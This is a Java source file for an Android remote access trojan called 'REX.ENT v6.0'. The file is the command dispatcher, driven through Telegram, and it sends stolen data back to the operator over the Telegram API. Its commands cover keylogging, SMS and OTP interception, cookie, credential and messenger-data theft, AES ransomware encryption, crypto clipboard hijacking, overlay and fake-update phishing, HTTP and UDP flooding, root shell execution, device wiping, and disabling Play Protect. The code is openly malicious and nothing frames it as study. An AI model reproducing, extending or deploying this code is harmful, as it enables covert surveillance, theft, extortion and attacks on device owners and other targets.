package com.enterprise.rat.commands;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import com.enterprise.rat.admin.AdminReceiver;
import com.enterprise.rat.activities.FakeUpdateActivity;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.AntiVM;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;

public class CommandHandler {
    private Context context;
    private FileManager fileManager;
    private SMSManager smsManager;
    private LocationManager locationManager;
    private CameraManager cameraManager;
    private DeviceInfoManager deviceInfoManager;
    private ContactManager contactManager;
    private CallManager callManager;
    private AudioManager audioManager;
    private ScreenManager screenManager;
    private KeyloggerManager keyloggerManager;
    private ShellManager shellManager;
    private SocialMediaManager socialMediaManager;
    private AppManager appManager;
    private PhishingManager phishingManager;
    private CallRecorderManager callRecorderManager;
    private CookieStealerManager cookieStealerManager;
    private RansomwareManager ransomwareManager;
    private WiFiScannerManager wifiScannerManager;
    private CryptoClipboardManager cryptoClipboardManager;
    private CredentialDumper credentialDumper;
    private AppControllerManager appControllerManager;
    private ProcessManager processManager;
    private SIMInfoManager simInfoManager;
    private USSDManager ussdManager;
    private SMSForwarderManager smsForwarderManager;
    private NotificationReplyManager notificationReplyManager;
    private GeofenceManager geofenceManager;
    private CalendarDumpManager calendarDumpManager;
    private SystemSettingsManager systemSettingsManager;
    private FlashlightManager flashlightManager;
    private WallpaperManager wallpaperManager;
    private TTSSpeakManager ttsSpeakManager;
    private ZipManager zipManager;
    private AppUsageStatsManager usageStatsManager;
    private SearchFileManager searchFileManager;
    private BluetoothScannerManager bluetoothScannerManager;
    private SelfUpdateManager selfUpdateManager;
    private ScreenStreamManager screenStreamManager;
    private AntiDebugDetector antiDebugDetector;
    private GmailExtractorManager gmailExtractorManager;
    private LiveStreamManager liveStreamManager;
    private AntiUninstallManager antiUninstallManager;
    private OverlayPhishingManager overlayPhishingManager;
    private CryptoClipboardHijackManager cryptoClipboardHijackManager;
    private ScreenLiveStreamManager screenLiveStreamManager;

    public CommandHandler(Context context) {
        this.context = context;
        this.fileManager = new FileManager(context);
        this.smsManager = new SMSManager(context);
        this.locationManager = new LocationManager(context);
        this.cameraManager = new CameraManager(context);
        this.deviceInfoManager = new DeviceInfoManager(context);
        this.contactManager = new ContactManager(context);
        this.callManager = new CallManager(context);
        this.audioManager = new AudioManager(context);
        this.screenManager = new ScreenManager(context);
        this.keyloggerManager = new KeyloggerManager(context);
        this.shellManager = new ShellManager();
        this.socialMediaManager = new SocialMediaManager(context);
        this.appManager = new AppManager(context);
        this.phishingManager = new PhishingManager(context);
        this.callRecorderManager = new CallRecorderManager(context);
        this.cookieStealerManager = new CookieStealerManager(context);
        this.ransomwareManager = new RansomwareManager(context);
        this.wifiScannerManager = new WiFiScannerManager(context);
        this.cryptoClipboardManager = new CryptoClipboardManager(context);
        this.credentialDumper = new CredentialDumper(context);
        this.appControllerManager = new AppControllerManager(context);
        this.processManager = new ProcessManager(context);
        this.simInfoManager = new SIMInfoManager(context);
        this.ussdManager = new USSDManager(context);
        this.smsForwarderManager = new SMSForwarderManager(context);
        this.notificationReplyManager = new NotificationReplyManager(context);
        this.geofenceManager = new GeofenceManager(context);
        this.calendarDumpManager = new CalendarDumpManager(context);
        this.systemSettingsManager = new SystemSettingsManager(context);
        this.flashlightManager = new FlashlightManager(context);
        this.wallpaperManager = new WallpaperManager(context);
        this.ttsSpeakManager = new TTSSpeakManager(context);
        this.zipManager = new ZipManager();
        this.usageStatsManager = new AppUsageStatsManager(context);
        this.searchFileManager = new SearchFileManager();
        this.bluetoothScannerManager = new BluetoothScannerManager(context);
        this.selfUpdateManager = new SelfUpdateManager(context);
        this.screenStreamManager = new ScreenStreamManager(context);
        this.antiDebugDetector = new AntiDebugDetector();
        this.gmailExtractorManager = new GmailExtractorManager();
        this.liveStreamManager = new LiveStreamManager(context);
        this.antiUninstallManager = new AntiUninstallManager(context);
        this.overlayPhishingManager = new OverlayPhishingManager(context);
        this.cryptoClipboardHijackManager = new CryptoClipboardHijackManager(context);
        this.screenLiveStreamManager = new ScreenLiveStreamManager(context);
    }

    public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
        String[] parts = text.trim().split("\\s+");
        if (parts.length == 0) return;
        String cmd = parts[0].toLowerCase();
        if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/menu")) { processGlobal(cmd); return; }

        String target = "ALL";
        String[] args = new String[0];
        if (parts.length >= 2) {
            String second = parts[1].toUpperCase();
            if (second.startsWith("SESSION_") || second.equals("ALL")) {
                target = second;
                args = new String[parts.length - 2];
                System.arraycopy(parts, 2, args, 0, args.length);
            } else {
                args = new String[parts.length - 1];
                System.arraycopy(parts, 1, args, 0, args.length);
            }
        }

        String mySession = BotConfig.SESSION_ID.toUpperCase();
        if (!target.equals("ALL") && !target.equals(mySession)) return;

        execute(cmd, args);
    }

    private void processGlobal(String cmd) {
        if (cmd.equals("/start")) {
            TelegramApi.sendMessage("⚡ <b>REX.ENT v6.0</b>\nSession: <code>" + BotConfig.SESSION_ID + "</code>\n\nGunakan <code>/menu</code> untuk daftar perintah.");
        } else {
            TelegramApi.sendMessage(getMenu());
        }
    }

    private String getMenu() {
        return "<b>📋 REX.ENT v6.0 — COMMAND MENU</b>\n\n" +
            "<b>📁 File Manager</b>\n<code>/ls /download /rm /rename /search /zip</code>\n\n" +
            "<b>📍 Location</b>\n<code>/location /gps /geofence</code>\n\n" +
            "<b>💬 SMS / Calls</b>\n<code>/sms_list /sendsms /delsms /calls /contacts /sms_fwd</code>\n\n" +
            "<b>📷 Camera</b>\n<code>/photo_front /photo_back /record /call_record</code>\n\n" +
            "<b>🎙 Audio</b>\n<code>/mic /liveaudio</code>\n\n" +
            "<b>🖥 Screen</b>\n<code>/screenshot /screenrecord /screen_lock /screen_unlock /stream_start /stream_stop</code>\n\n" +
            "<b>⌨ Keylogger</b>\n<code>/keylog_start /keylog_stop /keylog_dump</code>\n\n" +
            "<b>📱 Device</b>\n<code>/info /apps /battery /network /permissions /cpu_ram /usage</code>\n\n" +
            "<b>📋 Clipboard</b>\n<code>/clipboard /setclip /crypto_monitor_start /crypto_hijack_start /crypto_hijack_stop</code>\n\n" +
            "<b>🔔 Notification</b>\n<code>/notif /fakenotif /otp_scan /reply</code>\n\n" +
            "<b>📦 Stealer</b>\n<code>/steal_images /steal_docs /extract_wa /extract_tg /cookies /history</code>\n\n" +
            "<b>🌐 Network</b>\n<code>/httpflood /udpflood /wifi_scan /wifi_pass /bluetooth</code>\n\n" +
            "<b>⚙ Shell</b>\n<code>/shell /sush /process_list /kill_pid /kill_pkg</code>\n\n" +
            "<b>🛡 System</b>\n<code>/openurl /toast /phish /vibrate /playsound /lock /wipe /destroy /hideicon</code>\n\n" +
            "<b>🎣 Phishing</b>\n<code>/overlay_phish /overlay_remove /fake_update</code>\n\n" +
            "<b>🔐 Protection</b>\n<code>/uninstall_block /uninstall_unblock</code>\n\n" +
            "<b>🎮 Control</b>\n<code>/flashlight /volume /brightness /ring_mode /wallpaper /speak</code>\n\n" +
            "<b>➕ Other</b>\n<code>/sim_info /ussd /calendar_dump /launch /update /check_env /gmail /socmed /cred_harvest_start /cred_dump</code>\n\n" +
            "<b>🆕 CRITICAL v6.0</b>\n" +
            "<code>/stream_live [port]</code> — Live screen streaming\n" +
            "<code>/stream_live_stop</code> — Stop live stream\n" +
            "<code>/ransomware [path] [key]</code> — Encrypt files (AES‑256)\n" +
            "<code>/decrypt [path] [key]</code> — Decrypt ransomware\n" +
            "<code>/lock_capture_start</code> — Start PIN/pattern capture\n" +
            "<code>/lock_capture_stop</code> — Stop & dump captured credentials\n" +
            "<code>/anti_vm</code> — Run anti‑VM/emulator detection\n" +
            "<code>/disable_playprotect</code> — Disable Play Protect\n" +
            "<code>/enable_playprotect</code> — Re‑enable Play Protect\n" +
            "<code>/block_tap_start</code> — Block force‑close/uninstall buttons\n" +
            "<code>/block_tap_stop</code> — Stop blocking";
    }

    private void execute(String cmd, String[] args) {
        try {
            switch (cmd) {
                case "/info": deviceInfoManager.sendDeviceInfo(); break;
                case "/ls": fileManager.listDirectory(args.length > 0 ? args[0] : Environment.getExternalStorageDirectory().getAbsolutePath()); break;
                case "/download": if (args.length > 0) fileManager.uploadFile(args[0]); break;
                case "/rm": fileManager.deleteFile(args.length > 0 ? args[0] : ""); break;
                case "/rename": fileManager.renameFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : ""); break;
                case "/sms_list": smsManager.sendSMSList(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/sendsms": smsManager.sendSMS(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); break;
                case "/delsms": smsManager.deleteSMS(args.length > 0 ? args[0] : ""); break;
                case "/calls": callManager.sendCallLogs(args.length > 0 ? Integer.parseInt(args[0]) : 20); break;
                case "/contacts": contactManager.sendContacts(); break;
                case "/location": locationManager.sendCurrentLocation(); break;
                case "/gps": locationManager.startLiveGPS(); break;
                case "/photo_front": cameraManager.takePhoto(1); break;
                case "/photo_back": cameraManager.takePhoto(0); break;
                case "/record": cameraManager.recordVideo(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/mic": audioManager.recordAudio(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/liveaudio": audioManager.startLiveStream(); break;
                case "/screenshot": screenManager.takeScreenshot(); break;
                case "/screenrecord": screenManager.startScreenRecord(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/keylog_start": keyloggerManager.start(); break;
                case "/keylog_stop": keyloggerManager.stop(); break;
                case "/keylog_dump": keyloggerManager.sendLogs(); break;
                case "/apps": appManager.listInstalledApps(); break;
                case "/battery": deviceInfoManager.sendBatteryStatus(); break;
                case "/network": deviceInfoManager.sendNetworkInfo(); break;
                case "/permissions": deviceInfoManager.sendPermissions(); break;
                case "/clipboard": ClipboardHelper.getClipboard(context); break;
                case "/setclip": ClipboardHelper.setClipboard(context, joinArgs(args, 0)); break;
                case "/notif": NotificationManager.dumpNotifications(); break;
                case "/fakenotif": NotificationManager.sendFake(context, args.length > 0 ? args[0] : "Alert", args.length > 1 ? joinArgs(args, 1) : "Message"); break;
                case "/steal_images": StealerManager.stealImages(context); break;
                case "/steal_docs": StealerManager.stealDocuments(context); break;
                case "/extract_wa": socialMediaManager.extractWhatsApp(); break;
                case "/extract_tg": socialMediaManager.extractTelegram(); break;
                case "/httpflood": NetworkManager.httpFlood(args.length > 0 ? args[0] : "...", args.length > 1 ? Integer.parseInt(args[1]) : 100); break;
                case "/udpflood": NetworkManager.udpFlood(args.length > 0 ? args[0] : "...", args.length > 1 ? Integer.parseInt(args[1]) : 53, args.length > 2 ? Integer.parseInt(args[2]) : 30); break;
                case "/shell": ShellManager.executeCommand(joinArgs(args, 0)); break;
                case "/sush": ShellManager.executeRootCommand(joinArgs(args, 0)); break;
                case "/openurl": phishingManager.openURL(args.length > 0 ? args[0] : ""); break;
                case "/toast": SystemManager.showToast(context, joinArgs(args, 0)); break;
                case "/phish": PhishingManager.showPhishingDialog(context, args.length > 0 ? args[0] : "Google", args.length > 1 ? joinArgs(args, 1) : "Verify"); break;
                case "/vibrate": SystemManager.vibrate(context, args.length > 0 ? Integer.parseInt(args[0]) : 1000); break;
                case "/playsound": SystemManager.playSound(context); break;
                case "/lock": SystemManager.lockDevice(context); break;
                case "/wipe": SystemManager.wipeDevice(context); break;
                case "/destroy": SystemManager.selfDestruct(context); break;
                case "/hideicon": SystemManager.hideIcon(context); break;
                case "/autostart": SystemManager.enableAutostart(context); break;
                case "/socmed": socialMediaManager.auditSocialMedia(); break;
                case "/call_record": callRecorderManager.startCallRecording(args.length > 0 ? Integer.parseInt(args[0]) : 30); break;
                case "/cookies": cookieStealerManager.stealCookies(); break;
                case "/history": cookieStealerManager.stealChromeHistory(); break;
                case "/screen_lock": ransomwareManager.showLockScreen(joinArgs(args, 0)); break;
                case "/screen_unlock": ransomwareManager.removeLockScreen(); break;
                case "/wifi_scan": wifiScannerManager.scanNetworks(); break;
                case "/wifi_pass": wifiScannerManager.retrievePasswords(); break;
                case "/crypto_hijack_start": cryptoClipboardHijackManager.start(); break;
                case "/crypto_hijack_stop": cryptoClipboardHijackManager.stop(); break;
                case "/cred_harvest_start": credentialDumper.startCredentialHarvest(); break;
                case "/cred_dump": credentialDumper.dumpCredentials(); break;
                case "/launch": appControllerManager.launchApp(args.length > 0 ? args[0] : ""); break;
                case "/uninstall": appControllerManager.uninstallApp(args.length > 0 ? args[0] : ""); break;
                case "/process_list": processManager.listProcesses(); break;
                case "/kill_pid": processManager.killProcess(args.length > 0 ? args[0] : ""); break;
                case "/kill_pkg": processManager.killPackage(args.length > 0 ? args[0] : ""); break;
                case "/sim_info": simInfoManager.getSIMInfo(); break;
                case "/ussd": ussdManager.sendUSSD(args.length > 0 ? args[0] : ""); break;
                case "/sms_fwd": smsForwarderManager.setForward(args.length > 0 ? args[0] : ""); break;
                case "/reply": notificationReplyManager.replyToNotification(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); break;
                case "/geofence": geofenceManager.setGeofence(args.length > 0 ? Double.parseDouble(args[0]) : 0, args.length > 1 ? Double.parseDouble(args[1]) : 0, args.length > 2 ? Float.parseFloat(args[2]) : 500); break;
                case "/calendar_dump": calendarDumpManager.dumpCalendar(); break;
                case "/volume": systemSettingsManager.setVolume(args.length > 0 ? Integer.parseInt(args[0]) : 5); break;
                case "/brightness": systemSettingsManager.setBrightness(args.length > 0 ? Integer.parseInt(args[0]) : 100); break;
                case "/ring_mode": systemSettingsManager.setRingMode(args.length > 0 ? args[0] : "normal"); break;
                case "/flashlight": flashlightManager.toggle(args.length > 0 ? Boolean.parseBoolean(args[0]) : true); break;
                case "/wallpaper": wallpaperManager.setFromUrl(args.length > 0 ? args[0] : ""); break;
                case "/speak": ttsSpeakManager.speak(joinArgs(args, 0)); break;
                case "/zip": zipManager.zipFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : null); break;
                case "/usage": usageStatsManager.getStats(); break;
                case "/search": searchFileManager.search(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : ""); break;
                case "/bluetooth": bluetoothScannerManager.enumerate(); break;
                case "/update": selfUpdateManager.downloadAndInstall(args.length > 0 ? args[0] : ""); break;
                case "/otp_scan": OTPInterceptorManager.interceptOTP(); break;
                case "/cpu_ram": {
                    android.app.ActivityManager am = (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
                    android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
                    am.getMemoryInfo(mi);
                    TelegramApi.sendMessage("<b>📊 CPU & RAM</b>\nTotal: <code>" + mi.totalMem/(1024*1024) + "MB</code>\nAvailable: <code>" + mi.availMem/(1024*1024) + "MB</code>");
                    break;
                }
                case "/stream_live": screenLiveStreamManager.startStream(args.length > 0 ? Integer.parseInt(args[0]) : 8080); break;
                case "/stream_live_stop": screenLiveStreamManager.stopStream(); break;
                case "/ransomware": RansomwareCryptoManager.encryptFiles(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : null); break;
                case "/decrypt": RansomwareCryptoManager.decryptFiles(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : null); break;
                case "/lock_capture_start": LockScreenCaptureManager.startCapture(); break;
                case "/lock_capture_stop": LockScreenCaptureManager.stopCapture(); break;
                case "/anti_vm": TelegramApi.sendMessage(AntiVM.getDetectionReport()); break;
                case "/disable_playprotect": PlayProtectDisabler.disable(); break;
                case "/enable_playprotect": PlayProtectDisabler.enable(); break;
                case "/block_tap_start": {
                    AccessibilityService svc = AccessibilityService.getInstance();
                    if (svc != null) AutoTapBlocker.enable(svc); else TelegramApi.sendMessage("❌ Accessibility not active.");
                    break;
                }
                case "/block_tap_stop": {
                    AccessibilityService svc = AccessibilityService.getInstance();
                    if (svc != null) AutoTapBlocker.disable(svc); else TelegramApi.sendMessage("❌ Accessibility not active.");
                    break;
                }
                case "/fake_update": showFakeUpdate(); break;
                case "/reset_grant": showFakeUpdate(); break;
                default: TelegramApi.sendMessage("Perintah tidak dikenal. Ketik /menu untuk daftar perintah."); break;
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Error: " + e.getMessage());
        }
    }

    private void showFakeUpdate() {
        try {
            Intent intent = new Intent(context, FakeUpdateActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            TelegramApi.sendMessage("📱 Fake update screen displayed.");
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ " + e.getMessage());
        }
    }

    private String joinArgs(String[] args, int start) {
        StringBuilder sb = new StringBuilder();
        for (int i = start; i < args.length; i++) { if (i > start) sb.append(" "); sb.append(args[i]); }
        return sb.toString();
    }
}
